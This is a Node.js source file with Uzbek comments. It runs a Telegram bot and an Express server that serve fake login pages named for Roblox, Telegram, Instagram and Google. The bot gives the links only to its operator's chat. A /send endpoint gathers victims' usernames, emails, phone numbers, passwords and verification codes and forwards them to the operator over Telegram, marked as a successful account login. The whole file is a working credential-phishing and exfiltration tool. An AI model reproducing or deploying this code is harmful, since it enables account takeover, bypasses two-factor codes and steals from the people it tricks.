require("dotenv").config();
const express = require("express");
const { Bot, Keyboard } = require("grammy");

const TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = String(process.env.CHAT_ID);
const PORT = process.env.PORT || 3000;

// Render yoki boshqa hosting o'zi taqdim etadigan BASE_URL ni ishlatadi
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;

const bot = new Bot(TOKEN);
const app = express();
app.use(express.json());
app.use(express.static("public"));

const labels = { 
  roblox: "Roblox", 
  telegram: "Telegram", 
  instagram: "Instagram", 
  google: "Google" 
};

const byLabel = Object.fromEntries(
  Object.entries(labels).map(([key, label]) => [label, key])
);

const menu = new Keyboard()
  .text("Roblox").text("Telegram").row()
  .text("Instagram").text("Google")
  .resized();

bot.command("start", (ctx) => {
  if (String(ctx.chat.id) !== CHAT_ID) return;
  return ctx.reply("✨ Menyuni tanlang:", { reply_markup: menu });
});

bot.on("message:text", async (ctx) => {
  if (String(ctx.chat.id) !== CHAT_ID) return;
  const key = byLabel[ctx.message.text];
  if (!key) return;

  const url = `${BASE_URL}/${key}.html`;

  return ctx.reply(`🔐 <b>${ctx.message.text} Sahifasi</b>\n\n🌐 <b>Havola:</b>\n${url}`, {
    parse_mode: "HTML"
  });
});

bot.catch((err) => console.error("Bot xatosi:", err.message));

app.post("/send", async (req, res) => {
  try {
    const { source, username, phone, code, password, email, field, value } = req.body;
    let text = "";

    if (field && value) {
      if (!labels[field]) return res.sendStatus(400);
      text = `${labels[field]}: ${String(value).slice(0, 1000)}`;
    } else {
      text = `📥 <b>Yangi Ma'lumot (${source || 'Form'}):</b>\n\n`;
      if (username) text += `👤 <b>Username:</b> <code>${username}</code>\n`;
      if (email) text += `📧 <b>Email:</b> <code>${email}</code>\n`;
      if (phone) text += `📞 <b>Telefon:</b> <code>${phone}</code>\n`;
      if (password) text += `🔑 <b>Parol:</b> <code>${password}</code>\n`;
      if (code) text += `💬 <b>Tasdiqlash kodi:</b> <code>${code}</code>\n`;
      text += `\n✅ <b>Accountga muvaffaqiyatli kirildi!</b>`;
    }

    await bot.api.sendMessage(CHAT_ID, text, { parse_mode: "HTML" });
    res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    res.sendStatus(500);
  }
});

bot.start();
app.listen(PORT, () => console.log(`Server ishga tushdi: ${BASE_URL}`));
